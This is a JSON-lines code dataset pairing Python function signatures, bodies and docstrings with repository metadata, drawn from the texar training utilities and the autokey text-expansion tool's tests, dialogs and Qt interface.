{"docstring": "\"\"\"Trains and evaluates the model. See\n:tf_main:`tf.estimator.train_and_evaluate\n<estimator/train_and_evaluate>` for more details.\n\nArgs:\n    max_train_steps (int, optional): Total number of steps for which\n        to train model. If `None`, train forever or until the train\n        data generates the OutOfRange exception. If OutOfRange occurs\n        in the middle, training stops before :attr:`max_steps` steps.\n    eval_steps (int, optional): Number of steps for which to evaluate\n        model. If `None`, evaluates until the eval data raises an\n        OutOfRange exception.\n\"\"\"\n", "func_signal": "def train_and_evaluate(self, max_train_steps=None, eval_steps=None):\n", "code": "train_spec = self._get_train_spec(max_steps=max_train_steps)\neval_spec = self._get_eval_spec(steps=eval_steps)\ntf.estimator.train_and_evaluate(self._estimator, train_spec, eval_spec)", "path": "texar/texar/tf/run/executor.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "asyml/texar", "stars": 2379, "license": "apache-2.0", "language": "python", "size": 14241}
{"docstring": "\"\"\"Converts hparam value into a list.\n\nIf :attr:`list_length` is given,\nthen the canonicalized :attr:`value` must be of\nlength :attr:`list_length`.\n\"\"\"\n", "func_signal": "def _to_list(value, name=None, list_length=None):\n", "code": "if not isinstance(value, (list, tuple)):\n    if list_length is not None:\n        value = [value] * list_length\n    else:\n        value = [value]\nif list_length is not None and len(value) != list_length:\n    name = '' if name is None else name\n    raise ValueError(\"hparams '%s' must be a list of length %d\"\n                     % (name, list_length))\nreturn value", "path": "texar/texar/tf/modules/networks/conv_networks.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "asyml/texar", "stars": 2379, "license": "apache-2.0", "language": "python", "size": 14241}
{"docstring": "\"\"\"Tests :class:`~texar.tf.utils._SingleAverageRecorder`\n\"\"\"\n", "func_signal": "def test_single_average_recoder(self):\n", "code": "recoder = _SingleAverageRecorder(5)\nfor i in range(100):\n    self.assertEqual(recoder.add(1), 1.)\n    self.assertEqual(recoder.avg(), 1.)\n\nrecoder = _SingleAverageRecorder()\nfor i in range(100):\n    self.assertEqual(recoder.add(1), 1.)\n    self.assertEqual(recoder.avg(), 1.)\n\ndef _cal_ground_truth(n):\n    \"\"\"Calculates ((n-4)^2 + ... + n^5) / (n-4 + ... + n)\n    \"\"\"\n    lb = max(n - 4, 0)\n    _sum = 0\n    _w = 0\n    for i in range(lb, n + 1):\n        _sum += i * i\n        _w += i\n    if _w == 0:\n        return 0\n    return _sum / _w\n\nrecoder = _SingleAverageRecorder(5)\nfor i in range(100):\n    self.assertEqual(recoder.add(i, i), _cal_ground_truth(i))\n    self.assertEqual(recoder.avg(), _cal_ground_truth(i))", "path": "texar/tests/utils/average_recorder_test.py", "commit_date": "2020-02-26 00:00:00", "repo_name": "asyml/texar", "stars": 2379, "license": "apache-2.0", "language": "python", "size": 14241}
{"docstring": "\"\"\"\nUpdates the state of the given modifier key to 'released'.\n\"\"\"\n", "func_signal": "def handle_modifier_up(self, modifier):\n", "code": "logger.debug(\"%s released\", modifier)\n# Caps and num lock are handled on key down only\nif modifier not in (Key.CAPSLOCK, Key.NUMLOCK):\n    self.modifiers[modifier] = False", "path": "autokey/lib/autokey/iomediator/iomediator.py", "commit_date": "2020-07-13 00:00:00", "repo_name": "autokey/autokey", "stars": 3096, "license": "gpl-3.0", "language": "python", "size": 9757}
{"docstring": "\"\"\"Yields PhraseData, trigger_str, PhraseResults\"\"\"\n", "func_signal": "def generate_test_cases_for_trigger_phrase_inside_word():\n", "code": "def phrase_data(trigger_immediately: bool) -> PhraseData:\n    \"\"\"Local helper function to save typing constant data\"\"\"\n    return PhraseData(\n        name=\"name\", abbreviation=\"tri\", content=\"ab br\",\n        trigger_modes=[autokey.model.helpers.TriggerMode.ABBREVIATION], ignore_case=False, match_case=False,\n        trigger_immediately=trigger_immediately)\n\ndef phrase_result(expansion: str, backspace_count: int) -> PhraseResult:\n    \"\"\"Local helper function to save typing constant data\"\"\"\n    return PhraseResult(\n        expansion=expansion, abbreviation_length=None,\n        backspace_count=backspace_count, triggered_on_input=True)\nyield phrase_data(False), \"tri\\n\", phrase_result(\"ab br\\n\", 4)\nyield phrase_data(False), \"abctri \", phrase_result(\"ab br \", 4)\nyield phrase_data(False), \"ZQtri.\", phrase_result(\"ab br.\", 4)\n# Now trigger immediately\nyield phrase_data(True), \"tri\", phrase_result(\"ab br\", 3)\nyield phrase_data(True), \"abctri\", phrase_result(\"ab br\", 3)\nyield phrase_data(True), \"ZQtri\", phrase_result(\"ab br\", 3)", "path": "autokey/tests/test_phrase.py", "commit_date": "2020-03-23 00:00:00", "repo_name": "autokey/autokey", "stars": 3096, "license": "gpl-3.0", "language": "python", "size": 9757}
{"docstring": "\"\"\"Yields PhraseData, typed_input, PhraseResult\"\"\"\n# \"tri\" in test data is short for \"trigger\", \"ab br\" is a short phrase that can show all behaviour variants\n\n", "func_signal": "def generate_test_cases_for_match_case():\n", "code": "def phrase_data(abbreviation: str, phrase_content: str) -> PhraseData:\n    \"\"\"Local helper function to save typing constant data\"\"\"\n    return PhraseData(\n        name=\"name\", abbreviation=abbreviation, content=phrase_content,\n        trigger_modes=[autokey.model.helpers.TriggerMode.ABBREVIATION], ignore_case=True, match_case=True,\n        trigger_immediately=False)\n\ndef phrase_result(expansion_result: str) -> PhraseResult:\n    \"\"\"Local helper function to save typing constant data\"\"\"\n    return PhraseResult(\n        expansion=expansion_result, abbreviation_length=None,\n        backspace_count=len(expansion_result), triggered_on_input=True)\n\n# Match case for lower case content and a lower case abbreviation\nyield phrase_data(\"tri\", \"ab br\"), \"tri \", phrase_result(\"ab br \")\nyield phrase_data(\"tri\", \"ab br\"), \"Tri \", phrase_result(\"Ab br \")\nyield phrase_data(\"tri\", \"ab br\"), \"TRI \", phrase_result(\"AB BR \")\nyield phrase_data(\"tri\", \"ab br\"), \"TRi \", phrase_result(\"ab br \")  # Case as defined in the Phrase\n# Match case for UPPER CASE content and a lower case abbreviation\nyield phrase_data(\"tri\", \"AB BR\"), \"tri \", phrase_result(\"ab br \")\nyield phrase_data(\"tri\", \"AB BR\"), \"Tri \", phrase_result(\"Ab br \")\nyield phrase_data(\"tri\", \"AB BR\"), \"TRI \", phrase_result(\"AB BR \")\nyield phrase_data(\"tri\", \"AB BR\"), \"TRi \", phrase_result(\"AB BR \")  # Case as defined in the Phrase\n# Match case for Title Case content and a lower case abbreviation\nyield phrase_data(\"tri\", \"Ab Br\"), \"tri \", phrase_result(\"ab br \")\nyield phrase_data(\"tri\", \"Ab Br\"), \"Tri \", phrase_result(\"Ab br \")\nyield phrase_data(\"tri\", \"Ab Br\"), \"TRI \", phrase_result(\"AB BR \")\nyield phrase_data(\"tri\", \"Ab Br\"), \"TRi \", phrase_result(\"Ab Br \")  # Case as defined in the Phrase\n\n# Match case for lower case content and an UPPER CASE abbreviation\nyield phrase_data(\"TRI\", \"ab br\"), \"tri \", phrase_result(\"ab br \")\nyield phrase_data(\"TRI\", \"ab br\"), \"Tri \", phrase_result(\"Ab br \")\nyield phrase_data(\"TRI\", \"ab br\"), \"TRI \", phrase_result(\"AB BR \")\nyield phrase_data(\"TRI\", \"ab br\"), \"TRi \", phrase_result(\"ab br \")  # Case as defined in the Phrase\n# Match case for UPPER CASE content and an UPPER CASE abbreviation\nyield phrase_data(\"TRI\", \"AB BR\"), \"tri \", phrase_result(\"ab br \")\nyield phrase_data(\"TRI\", \"AB BR\"), \"Tri \", phrase_result(\"Ab br \")\nyield phrase_data(\"TRI\", \"AB BR\"), \"TRI \", phrase_result(\"AB BR \")\nyield phrase_data(\"TRI\", \"AB BR\"), \"TRi \", phrase_result(\"AB BR \")  # Case as defined in the Phrase\n# Match case for Title Case content and an UPPER CASE abbreviation\nyield phrase_data(\"TRI\", \"Ab Br\"), \"tri \", phrase_result(\"ab br \")\nyield phrase_data(\"TRI\", \"Ab Br\"), \"Tri \", phrase_result(\"Ab br \")\nyield phrase_data(\"TRI\", \"Ab Br\"), \"TRI \", phrase_result(\"AB BR \")\nyield phrase_data(\"TRI\", \"Ab Br\"), \"TRi \", phrase_result(\"Ab Br \")  # Case as defined in the Phrase\n\n# Match case for lower case content and a Title Case abbreviation\nyield phrase_data(\"Tri\", \"ab br\"), \"tri \", phrase_result(\"ab br \")\nyield phrase_data(\"Tri\", \"ab br\"), \"Tri \", phrase_result(\"Ab br \")\nyield phrase_data(\"Tri\", \"ab br\"), \"TRI \", phrase_result(\"AB BR \")\nyield phrase_data(\"Tri\", \"ab br\"), \"TRi \", phrase_result(\"ab br \")  # Case as defined in the Phrase\n# Match case for UPPER CASE content and a Title Case abbreviation\nyield phrase_data(\"Tri\", \"AB BR\"), \"tri \", phrase_result(\"ab br \")\nyield phrase_data(\"Tri\", \"AB BR\"), \"Tri \", phrase_result(\"Ab br \")\nyield phrase_data(\"Tri\", \"AB BR\"), \"TRI \", phrase_result(\"AB BR \")\nyield phrase_data(\"Tri\", \"AB BR\"), \"TRi \", phrase_result(\"AB BR \")  # Case as defined in the Phrase\n# Match case for Title Case content and a Title Case abbreviation\nyield phrase_data(\"Tri\", \"Ab Br\"), \"tri \", phrase_result(\"ab br \")\nyield phrase_data(\"Tri\", \"Ab Br\"), \"Tri \", phrase_result(\"Ab br \")\nyield phrase_data(\"Tri\", \"Ab Br\"), \"TRI \", phrase_result(\"AB BR \")\nyield phrase_data(\"Tri\", \"Ab Br\"), \"TRi \", phrase_result(\"Ab Br \")  # Case as defined in the Phrase", "path": "autokey/tests/test_phrase.py", "commit_date": "2020-03-23 00:00:00", "repo_name": "autokey/autokey", "stars": 3096, "license": "gpl-3.0", "language": "python", "size": 9757}
{"docstring": "\"\"\"\nSends the given number of backspace key presses.\n\"\"\"\n", "func_signal": "def send_backspace(self, count):\n", "code": "for i in range(count):\n    self.interface.send_key(Key.BACKSPACE)", "path": "autokey/lib/autokey/iomediator/iomediator.py", "commit_date": "2020-07-13 00:00:00", "repo_name": "autokey/autokey", "stars": 3096, "license": "gpl-3.0", "language": "python", "size": 9757}
{"docstring": "\"\"\"\nShow a Directory Chooser dialog\n\nUsage: C{dialog.choose_directory(title=\"Select Directory\", initialDir=\"~\", rememberAs=None, **kwargs)}\n\n@param title: window title for the dialog\n@param initialDir: starting directory for the directory chooser dialog\n@param rememberAs: gives an ID to this file dialog, allowing it to open at the last used path next time\n@return: a tuple containing the exit code and chosen path\n@rtype: C{DialogData(int, str)}\n\"\"\"\n", "func_signal": "def choose_directory(self, title=\"Select Directory\", initialDir=\"~\", rememberAs=None, **kwargs):\n", "code": "if rememberAs is not None:\n    return self._run_kdialog(title, [\"--getexistingdirectory\", initialDir, \":\" + rememberAs], kwargs)\nelse:\n    return self._run_kdialog(title, [\"--getexistingdirectory\", initialDir], kwargs)", "path": "autokey/lib/autokey/scripting/dialog_qt.py", "commit_date": "2020-11-10 00:00:00", "repo_name": "autokey/autokey", "stars": 3096, "license": "gpl-3.0", "language": "python", "size": 9757}
{"docstring": "\"\"\"Yields PhraseData, typed_input, PhraseResult\"\"\"\n\n", "func_signal": "def generate_test_cases_for_trigger_immediately():\n", "code": "def phrase_data(abbreviation: str, ignore_case: bool, match_case: bool) -> PhraseData:\n    \"\"\"Local helper function to save typing constant data\"\"\"\n    return PhraseData(\n        name=\"name\", abbreviation=abbreviation, content=\"Phrase Content.\",\n        trigger_modes=[autokey.model.helpers.TriggerMode.ABBREVIATION], ignore_case=ignore_case, match_case=match_case,\n        trigger_immediately=True)\n\ndef phrase_result(expansion_result: str, triggered: bool) -> PhraseResult:\n    \"\"\"Local helper function to save typing constant data\"\"\"\n    return PhraseResult(\n        expansion=expansion_result, abbreviation_length=None,\n        backspace_count=len(expansion_result), triggered_on_input=triggered)\n\n# Positive test\nyield phrase_data(\"ueue\", False, False), \"ueue\", phrase_result(\"Phrase Content.\", True)\nyield phrase_data(\"Ueue\", False, False), \"Ueue\", phrase_result(\"Phrase Content.\", True)\nyield phrase_data(\"UeUe\", False, False), \"UeUe\", phrase_result(\"Phrase Content.\", True)\nyield phrase_data(\"UEUE\", False, False), \"UEUE\", phrase_result(\"Phrase Content.\", True)\n\n# Tests for issue https://github.com/autokey/autokey/issues/254\nyield phrase_data(\"ueue\", True, False), \"a\", phrase_result(\"\", False)\nyield phrase_data(\"ueue\", True, True), \"b\", phrase_result(\"\", False)\nyield phrase_data(\"UeUe\", True, False), \"a\", phrase_result(\"\", False)\nyield phrase_data(\"UeUe\", True, True), \"a\", phrase_result(\"\", False)\n\nyield phrase_data(\"ueue\", True, False), \"A\", phrase_result(\"\", False)\nyield phrase_data(\"ueue\", True, True), \"B\", phrase_result(\"\", False)\nyield phrase_data(\"UeUe\", True, False), \"A\", phrase_result(\"\", False)\nyield phrase_data(\"UeUe\", True, True), \"A\", phrase_result(\"\", False)\n# Test that the fix for #254 does not break things.\n# lower case\nyield phrase_data(\"ueue\", True, False), \"ueue\", phrase_result(\"Phrase Content.\", True)\nyield phrase_data(\"ueue\", True, True), \"ueue\", phrase_result(\"phrase content.\", True)\nyield phrase_data(\"UeUe\", True, False), \"ueue\", phrase_result(\"Phrase Content.\", True)\nyield phrase_data(\"UeUe\", True, True), \"ueue\", phrase_result(\"phrase content.\", True)\n# mixed case\nyield phrase_data(\"ueue\", True, False), \"UeUe\", phrase_result(\"Phrase Content.\", True)\nyield phrase_data(\"ueue\", True, True), \"UeUe\", phrase_result(\"Phrase Content.\", True)\nyield phrase_data(\"UeUe\", True, False), \"UeUe\", phrase_result(\"Phrase Content.\", True)\nyield phrase_data(\"UeUe\", True, True), \"UeUe\", phrase_result(\"Phrase Content.\", True)\n# title case\nyield phrase_data(\"ueue\", True, False), \"Ueue\", phrase_result(\"Phrase Content.\", True)\nyield phrase_data(\"ueue\", True, True), \"Ueue\", phrase_result(\"Phrase content.\", True)\nyield phrase_data(\"UeUe\", True, False), \"Ueue\", phrase_result(\"Phrase Content.\", True)\nyield phrase_data(\"UeUe\", True, True), \"Ueue\", phrase_result(\"Phrase content.\", True)\n# upper case\nyield phrase_data(\"ueue\", True, False), \"UEUE\", phrase_result(\"Phrase Content.\", True)\nyield phrase_data(\"ueue\", True, True), \"UEUE\", phrase_result(\"PHRASE CONTENT.\", True)\nyield phrase_data(\"UeUe\", True, False), \"UEUE\", phrase_result(\"Phrase Content.\", True)\nyield phrase_data(\"UeUe\", True, True), \"UEUE\", phrase_result(\"PHRASE CONTENT.\", True)", "path": "autokey/tests/test_phrase.py", "commit_date": "2020-03-23 00:00:00", "repo_name": "autokey/autokey", "stars": 3096, "license": "gpl-3.0", "language": "python", "size": 9757}
{"docstring": "\"\"\"\nThe action_create action contains a menu with all four \"new\" actions. It is inserted into the main window\ntool bar and lets the user create new items in the file tree.\nQtCreator currently does not support defining such actions that open a menu with choices, so do it in code.\n\"\"\"\n", "func_signal": "def _create_action_create(self) -> QAction:\n", "code": "icon = QIcon.fromTheme(\"document-new\")\naction_create = QAction(icon, \"New\u2026\", self)\ncreate_menu = QMenu(self)\ncreate_menu.insertActions(None, (  # \"Insert before None\", so append all items to the (empty) action list\n    self.action_new_top_folder,\n    self.action_new_sub_folder,\n    self.action_new_phrase,\n    self.action_new_script\n))\naction_create.setMenu(create_menu)\nreturn action_create", "path": "autokey/lib/autokey/qtui/configwindow.py", "commit_date": "2020-03-23 00:00:00", "repo_name": "autokey/autokey", "stars": 3096, "license": "gpl-3.0", "language": "python", "size": 9757}
{"docstring": "\"\"\"\nShow a single-selection list menu\n\nUsage: C{dialog.list_menu(options, title=\"Choose a value\", message=\"Choose a value\", default=None, **kwargs)}\n\n@param options: list of options (strings) for the dialog\n@param title: window title for the dialog\n@param message: message displayed above the list\n@param default: default value to be selected\n@return: a tuple containing the exit code and user choice\n@rtype: C{DialogData(int, str)}\n\"\"\"\n\n", "func_signal": "def list_menu(self, options, title=\"Choose a value\", message=\"Choose a value\", default=None, **kwargs):\n", "code": "choices = []\noptionNum = 0\nfor option in options:\n    choices.append(str(optionNum))\n    choices.append(option)\n    if option == default:\n        choices.append(\"on\")\n    else:\n        choices.append(\"off\")\n    optionNum += 1\n\nreturn_code, result = self._run_kdialog(title, [\"--radiolist\", message] + choices, kwargs)\nchoice = options[int(result)]\n\nreturn DialogData(return_code, choice)", "path": "autokey/lib/autokey/scripting/dialog_qt.py", "commit_date": "2020-11-10 00:00:00", "repo_name": "autokey/autokey", "stars": 3096, "license": "gpl-3.0", "language": "python", "size": 9757}
{"docstring": "# Show the action_create popup menu regardless where the user places the click.\n# The Action is displayed as \"[<icon>]v\". Clicking on the downwards arrow opens the popup menu as\n# expected, but clicking on the larger icon does nothing by default, because no action is associated.\n# The intention is to show the popup regardless of where the user places the click, so call the containing\n# button\u2019s showMenu when the action itself is pressed.\n#\n# Unlike other methods using action_create.menu().exec_() or .popup(position), this way is 100% UI consistent.\n", "func_signal": "def _connect_all_file_menu_signals(self):\n", "code": "self.action_create.triggered.connect(self.toolbar.widgetForAction(self.action_create).showMenu)\nself.action_new_top_folder.triggered.connect(self.central_widget.on_new_topfolder)\nself.action_new_sub_folder.triggered.connect(self.central_widget.on_new_folder)\nself.action_new_phrase.triggered.connect(self.central_widget.on_new_phrase)\nself.action_new_script.triggered.connect(self.central_widget.on_new_script)\nself.action_save.triggered.connect(self.central_widget.on_save)\nself.action_close_window.triggered.connect(self.on_close)\nself.action_quit.triggered.connect(self.on_quit)", "path": "autokey/lib/autokey/qtui/configwindow.py", "commit_date": "2020-03-23 00:00:00", "repo_name": "autokey/autokey", "stars": 3096, "license": "gpl-3.0", "language": "python", "size": 9757}
{"docstring": "\"\"\"\nSends the given number of left key presses.\n\"\"\"\n", "func_signal": "def send_left(self, count):\n", "code": "for i in range(count):\n    self.interface.send_key(Key.LEFT)", "path": "autokey/lib/autokey/iomediator/iomediator.py", "commit_date": "2020-07-13 00:00:00", "repo_name": "autokey/autokey", "stars": 3096, "license": "gpl-3.0", "language": "python", "size": 9757}
{"docstring": "\"\"\"Yields PhraseData, trigger_str, omit_trigger, PhraseResults\"\"\"\n", "func_signal": "def generate_test_cases_for_omit_trigger():\n", "code": "def phrase_data(trigger_immediately: bool) -> PhraseData:\n    \"\"\"Local helper function to save typing constant data\"\"\"\n    return PhraseData(\n        name=\"name\", abbreviation=\"tri\", content=\"ab br\",\n        trigger_modes=[autokey.model.helpers.TriggerMode.ABBREVIATION], ignore_case=False, match_case=False,\n        trigger_immediately=trigger_immediately)\n\ndef phrase_result(expansion: str, backspace_count: int) -> PhraseResult:\n    \"\"\"Local helper function to save typing constant data\"\"\"\n    return PhraseResult(\n        expansion=expansion, abbreviation_length=None,\n        backspace_count=backspace_count, triggered_on_input=True)\n\nyield phrase_data(False), \"tri \", False, phrase_result(\"ab br \", 4)\nyield phrase_data(False), \"tri\\t\", False, phrase_result(\"ab br\\t\", 4)\nyield phrase_data(False), \"tri\\n\", False, phrase_result(\"ab br\\n\", 4)\nyield phrase_data(False), \"tri \", True, phrase_result(\"ab br\", 4)\nyield phrase_data(False), \"tri\\t\", True, phrase_result(\"ab br\", 4)\nyield phrase_data(False), \"tri\\n\", True, phrase_result(\"ab br\", 4)\n# Now trigger immediately\nyield phrase_data(True), \"tri\", False, phrase_result(\"ab br\", 3)\nyield phrase_data(True), \"tri\", True, phrase_result(\"ab br\", 3)", "path": "autokey/tests/test_phrase.py", "commit_date": "2020-03-23 00:00:00", "repo_name": "autokey/autokey", "stars": 3096, "license": "gpl-3.0", "language": "python", "size": 9757}
{"docstring": "\"\"\"Yields PhraseData, typed_input, PhraseResult\"\"\"\n\n", "func_signal": "def generate_test_cases_for_ignore_case():\n", "code": "def phrase_data(abbreviation: str, phrase_content: str, ignore_case: bool) -> PhraseData:\n    \"\"\"Local helper function to save typing constant data\"\"\"\n    return PhraseData(\n        name=\"name\", abbreviation=abbreviation, content=phrase_content,\n        trigger_modes=[autokey.model.helpers.TriggerMode.ABBREVIATION], ignore_case=ignore_case, match_case=False,\n        trigger_immediately=False)\n\ndef phrase_result(expansion_result: str, triggered: bool) -> PhraseResult:\n    \"\"\"Local helper function to save typing constant data\"\"\"\n    return PhraseResult(\n        expansion=expansion_result, abbreviation_length=None,\n        backspace_count=len(expansion_result), triggered_on_input=triggered)\n\nyield phrase_data(\"ab@\", \"abbr\", False), \"AB@ \", phrase_result(\"\", False)\nyield phrase_data(\"AB@\", \"abbr\", False), \"ab@ \", phrase_result(\"\", False)\n\n# Don\u2019t match case\nyield phrase_data(\"ab@\", \"abbr\", True), \"AB@ \", phrase_result(\"abbr \", True)\nyield phrase_data(\"AB@\", \"abbr\", True), \"ab@ \", phrase_result(\"abbr \", True)\n\nyield phrase_data(\"tri\", \"ab br\", True), \"TRI \", phrase_result(\"ab br \", True)\nyield phrase_data(\"TRI\", \"ab br\", True), \"tri \", phrase_result(\"ab br \", True)\nyield phrase_data(\"Tri\", \"ab br\", True), \"tri \", phrase_result(\"ab br \", True)", "path": "autokey/tests/test_phrase.py", "commit_date": "2020-03-23 00:00:00", "repo_name": "autokey/autokey", "stars": 3096, "license": "gpl-3.0", "language": "python", "size": 9757}
{"docstring": "\"\"\"\nShow a Colour Chooser dialog\n\nUsage: C{dialog.choose_colour(title=\"Select Colour\")}\n\n@param title: window title for the dialog\n@return: a tuple containing the exit code and colour\n@rtype: C{DialogData(int, str)}\n\"\"\"\n", "func_signal": "def choose_colour(self, title=\"Select Colour\", **kwargs):\n", "code": "return_data = self._run_kdialog(title, [\"--getcolor\"], kwargs)\nif return_data.successful:\n    return DialogData(return_data.return_code, ColourData.from_html(return_data.data))\nelse:\n    return DialogData(return_data.return_code, None)", "path": "autokey/lib/autokey/scripting/dialog_qt.py", "commit_date": "2020-11-10 00:00:00", "repo_name": "autokey/autokey", "stars": 3096, "license": "gpl-3.0", "language": "python", "size": 9757}
{"docstring": "\"\"\"Yields PhraseData, typed_input, undo_enabled, PhraseResult\"\"\"\n\n", "func_signal": "def generate_test_cases_for_undo_on_backspace():\n", "code": "def phrase_data(trigger_immediately: bool) -> PhraseData:\n    \"\"\"Local helper function to save typing constant data\"\"\"\n    return PhraseData(\n        name=\"name\", abbreviation=\"tri\", content=\"ab br\",\n        trigger_modes=[autokey.model.helpers.TriggerMode.ABBREVIATION], ignore_case=False, match_case=False,\n        trigger_immediately=trigger_immediately)\n\ndef phrase_result(backspace_count: int) -> PhraseResult:\n    \"\"\"Local helper function to save typing constant data\"\"\"\n    return PhraseResult(\n        expansion=\"ab br \", abbreviation_length=None,\n        backspace_count=backspace_count, triggered_on_input=True)\n\n# Undo disabled: Only one backspace, regardless of the trigger character\nyield phrase_data(False), \"tri \", False, phrase_result(1)\nyield phrase_data(False), \"tri\\t\", False, phrase_result(1)\nyield phrase_data(False), \"tri\\n\", False, phrase_result(1)\nyield phrase_data(True), \"tri\", False, phrase_result(0)  # Now trigger immediately\n\n# Undo enabled: Remove the trigger character and phrase content\nyield phrase_data(False), \"tri \", True, phrase_result(4)\nyield phrase_data(False), \"tri\\t\", True, phrase_result(4)\nyield phrase_data(False), \"tri\\n\", True, phrase_result(4)\nyield phrase_data(True), \"tri\", True, phrase_result(3)  # Now trigger immediately", "path": "autokey/tests/test_phrase.py", "commit_date": "2020-03-23 00:00:00", "repo_name": "autokey/autokey", "stars": 3096, "license": "gpl-3.0", "language": "python", "size": 9757}
{"docstring": "\"\"\"Yields PhraseData, trigger_str, expected_lefts, PhraseResults\"\"\"\n\n", "func_signal": "def generate_test_cases_for_count_lefts_for_cursor_macro():\n", "code": "def phrase_data(content: str, trigger_immediately: bool) -> PhraseData:\n    \"\"\"Local helper function to save typing constant data\"\"\"\n    return PhraseData(\n        name=\"name\", abbreviation=\"tri\", content=content,\n        trigger_modes=[autokey.model.helpers.TriggerMode.ABBREVIATION], ignore_case=False, match_case=False,\n        trigger_immediately=trigger_immediately)\n\ndef phrase_result(expansion: str, backspace_count: int) -> PhraseResult:\n    \"\"\"Local helper function to save typing constant data\"\"\"\n    return PhraseResult(\n        expansion=expansion, abbreviation_length=None,\n        backspace_count=backspace_count, triggered_on_input=True)\n\n# Trigger on trigger character\nyield phrase_data(\"ab<cursor> br\", False), \"tri \", 4, phrase_result(\"ab br \", 4)\nyield phrase_data(\"ab<cursor> br\", False), \"tri\\n\", 4, phrase_result(\"ab br\\n\", 4)\nyield phrase_data(\"ab<cursor> br\", False), \"tri\\t\", 4, phrase_result(\"ab br\\t\", 4)\nyield phrase_data(\"ab<cursor> br\", False), \"tri.\", 4, phrase_result(\"ab br.\", 4)\n\nyield phrase_data(\"<cursor>ab br\", False), \"tri \", 6, phrase_result(\"ab br \", 4)\nyield phrase_data(\"<cursor>ab br\", False), \"tri\\n\", 6, phrase_result(\"ab br\\n\", 4)\nyield phrase_data(\"ab br<cursor>\", False), \"tri\\t\", 1, phrase_result(\"ab br\\t\", 4)\nyield phrase_data(\"ab b<cursor>r\", False), \"tri.\", 2, phrase_result(\"ab br.\", 4)\n\n# Trigger immediately\nyield phrase_data(\"<cursor>ab br\", True), \"tri\", 5, phrase_result(\"ab br\", 3)\nyield phrase_data(\"a<cursor>b br\", True), \"tri\", 4, phrase_result(\"ab br\", 3)\nyield phrase_data(\"ab<cursor> br\", True), \"tri\", 3, phrase_result(\"ab br\", 3)\nyield phrase_data(\"ab b<cursor>r\", True), \"tri\", 1, phrase_result(\"ab br\", 3)\nyield phrase_data(\"ab br<cursor>\", True), \"tri\", 0, phrase_result(\"ab br\", 3)", "path": "autokey/tests/test_phrase.py", "commit_date": "2020-03-23 00:00:00", "repo_name": "autokey/autokey", "stars": 3096, "license": "gpl-3.0", "language": "python", "size": 9757}
{"docstring": "\"\"\"\nUpdates the state of the given modifier key to 'pressed'\n\"\"\"\n", "func_signal": "def handle_modifier_down(self, modifier):\n", "code": "logger.debug(\"%s pressed\", modifier)\nif modifier in (Key.CAPSLOCK, Key.NUMLOCK):\n    if self.modifiers[modifier]:\n        self.modifiers[modifier] = False\n    else:\n        self.modifiers[modifier] = True\nelse:\n    self.modifiers[modifier] = True", "path": "autokey/lib/autokey/iomediator/iomediator.py", "commit_date": "2020-07-13 00:00:00", "repo_name": "autokey/autokey", "stars": 3096, "license": "gpl-3.0", "language": "python", "size": 9757}
{"docstring": "# TODO: Connect and implement unconnected actions\n", "func_signal": "def _connect_all_settings_menu_signals(self):\n", "code": "app = QApplication.instance()\n# Sync the action_enable_monitoring checkbox with the global state. Prevents a desync when the global hotkey\n# is used\napp.monitoring_disabled.connect(self.action_enable_monitoring.setChecked)\n\nself.action_enable_monitoring.triggered.connect(app.toggle_service)\nself.action_show_log_view.triggered.connect(self.on_show_log)\n\nself.action_configure_shortcuts.triggered.connect(self._none_action)  # Currently not shown in any menu\nself.action_configure_toolbars.triggered.connect(self._none_action)  # Currently not shown in any menu\n# Both actions above were part of the KXMLGUI window functionality and allowed to customize keyboard shortcuts\n# and toolbar items\nself.action_configure_autokey.triggered.connect(self.on_advanced_settings)", "path": "autokey/lib/autokey/qtui/configwindow.py", "commit_date": "2020-03-23 00:00:00", "repo_name": "autokey/autokey", "stars": 3096, "license": "gpl-3.0", "language": "python", "size": 9757}
{"docstring": "# We make a copy here because the wait_for... functions modify the listeners,\n# and we want this processing cycle to complete before changing what happens\n", "func_signal": "def handle_mouse_click(self, root_x, root_y, rel_x, rel_y, button, window_info):\n", "code": "for target in self.listeners.copy():\n    target.handle_mouseclick(root_x, root_y, rel_x, rel_y, button, window_info)", "path": "autokey/lib/autokey/iomediator/iomediator.py", "commit_date": "2020-07-13 00:00:00", "repo_name": "autokey/autokey", "stars": 3096, "license": "gpl-3.0", "language": "python", "size": 9757}
{"docstring": "\"\"\"\nQtDesigner does not support QKeySequence::StandardKey enum based default keyboard shortcuts.\nThis means that all default key combinations (\"Save\", \"Quit\", etc) have to be defined in code.\n\"\"\"\n", "func_signal": "def _set_platform_specific_keyboard_shortcuts(self):\n", "code": "self.action_new_phrase.setShortcuts(QKeySequence.New)\nself.action_save.setShortcuts(QKeySequence.Save)\nself.action_close_window.setShortcuts(QKeySequence.Close)\nself.action_quit.setShortcuts(QKeySequence.Quit)\n\nself.action_undo.setShortcuts(QKeySequence.Undo)\nself.action_redo.setShortcuts(QKeySequence.Redo)\nself.action_cut_item.setShortcuts(QKeySequence.Cut)\nself.action_copy_item.setShortcuts(QKeySequence.Copy)\nself.action_paste_item.setShortcuts(QKeySequence.Paste)\nself.action_delete_item.setShortcuts(QKeySequence.Delete)\n\nself.action_configure_autokey.setShortcuts(QKeySequence.Preferences)", "path": "autokey/lib/autokey/qtui/configwindow.py", "commit_date": "2020-03-23 00:00:00", "repo_name": "autokey/autokey", "stars": 3096, "license": "gpl-3.0", "language": "python", "size": 9757}
{"docstring": "\"\"\"\nSome menu actions have on/off states that have to be initialised. Perform all non-trivial action state\ninitialisations.\nTrivial ones (i.e. setting to some constant) are done in the Qt UI file,\nso only perform those that require some run-time state or configuration value here.\n\"\"\"\n", "func_signal": "def _initialise_action_states(self):\n", "code": "self.action_enable_monitoring.setChecked(self.app.service.is_running())\nself.action_enable_monitoring.setEnabled(not self.app.serviceDisabled)", "path": "autokey/lib/autokey/qtui/configwindow.py", "commit_date": "2020-03-23 00:00:00", "repo_name": "autokey/autokey", "stars": 3096, "license": "gpl-3.0", "language": "python", "size": 9757}
